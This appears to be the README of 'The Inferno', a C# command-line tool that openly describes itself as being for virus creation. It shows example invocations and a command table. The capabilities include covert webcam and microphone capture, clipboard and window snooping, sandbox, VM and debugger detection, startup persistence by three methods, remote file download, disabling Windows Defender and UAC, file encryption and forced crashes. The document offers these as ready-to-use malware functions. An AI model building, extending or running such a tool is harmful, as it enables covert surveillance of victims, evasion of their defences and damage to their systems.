# :boom: The Inferno:
Simple command line tool for virus creation. Written on C#

<p align="center">
  <img src="logo.png"/>
</p>


# :diamonds: Example:
We can type it in command line:  
``` batch
inferno.exe "WEBCAM_SCREENSHOT" "screenshot.jpg" "4500" "1"
inferno.exe "Command" "Argument1" "Argument2" "Argument3"
```  

# :book: Commands table:
| Command                           | Argument 1  | Argument 2  | Argument 3  | Description                       |
|:---------------------------------:|:-----------:|:-----------:|:-----------:|:---------------------------------:|
| CLIPBOARD_SET                     |    text     |    :x:      |     :x:     | Set text to clipboard             |
| CLIPBOARD_GET                     |    :x:      |    :x:      |     :x:     | Get text from clipboard           |
| DESKTOP_SCREENSHOT                |    filename |    :x:      |     :x:     | Create screenshot of desktop      |
| WEBCAM_SCREENSHOT                 |    filename |    delay    |     camera  | Create screenshot from webcamera  |
| MICROPHONE_RECORD                 |    filename |    seconds  |     :x:     | Record audio from microphone      |
| BSOD                              |    :x:      |    :x:      |     :x:     | Make windows screen of death      |
| WALLPAPER                         |    filename |    :x:      |     :x:     | Set image as wallpaper            |
| GET_ACTIVE_WINDOW                 |    :x:      |    :x:      |     :x:     | Get title of active window        |
| GET_CURSOR_POSITION               |    :x:      |    :x:      |     :x:     | Get cursor position (x, y)        |
| SET_CURSOR_POSITION               |     X       |     Y       |     :x:     | Set cursor position (x, y)        |
| USER_IS_ACTIVE                    |    :x:      |    :x:      |     :x:     | Check if user is active           |
| STATUS_IN_SANDBOXIE               |    :x:      |    :x:      |     :x:     | Check if program in SandBoxie     |
| STATUS_IN_VIRTUALBOX              |    :x:      |    :x:      |     :x:     | Check if program in VirtualBox    |
| STATUS_IN_DEBUGGER                |    :x:      |    :x:      |     :x:     | Check if program in Debugger      |
| STATUS_IS_ADMIN                   |    :x:      |    :x:      |     :x:     | Check if program running as admin |
| AUTORUN_INSTALL_TASKSCHEDULER     |    filename |    :x:      |     :x:     | Add file to startup. Method with TaskScheduler |
| AUTORUN_UNINSTALL_TASKSCHEDULER   |    filename |    :x:      |     :x:     | Remove file from startup. Method with TaskScheduler |
| AUTORUN_INSTALL_REGISTRY          |    filename |    :x:      |     :x:     | Add file to startup. Method with Registry |
| AUTORUN_UNINSTALL_REGISTRY        |    filename |    :x:      |     :x:     | Remove file from startup. Method with Registry |
| AUTORUN_INSTALL_SHELLSTARTUP      |    filename |    :x:      |     :x:     | Add file to startup. Method with startup directory |
| AUTORUN_UNINSTALL_SHELLSTARTUP    |    filename |    :x:      |     :x:     | Remove file from startup. Method with startup directory |
| NETWORK_DOWNLOAD_FILE             |    url      |    filename |     :x:     | Download file and save.  |
| BYPASS_DISABLE_DEFENDER           |    :x:      |    :x:      |     :x:     | Disable Windows Defender |
| BYPASS_DISABLE_UAC                |    :x:      |    :x:      |     :x:     | Disable Windows UAC      |
| BYPASS_ENABLE_UAC                 |    :x:      |    :x:      |     :x:     | Enable  Windows UAC      |
| ADMIN_STARTFILE                   |    filename |    :x:      |     :x:     | Start file as admin      |
| FILE_ENCRYPT                      |    filename |    password |     :x:     | Encrypt file with key    |
| FILE_DECRYPT                      |    filename |    password |     :x:     | Decrypt file with key    |
| POWER_SHUTDOWN                    |    :x:      |    :x:      |     :x:     | Power off computer       |
| POWER_REBOOT                      |    :x:      |    :x:      |     :x:     | Restart computer         |
| POWER_HIBERNATE                   |    :x:      |    :x:      |     :x:     | Hibernate computer       |
| POWER_LOGOFF                      |    :x:      |    :x:      |     :x:     | Logoff computer          |
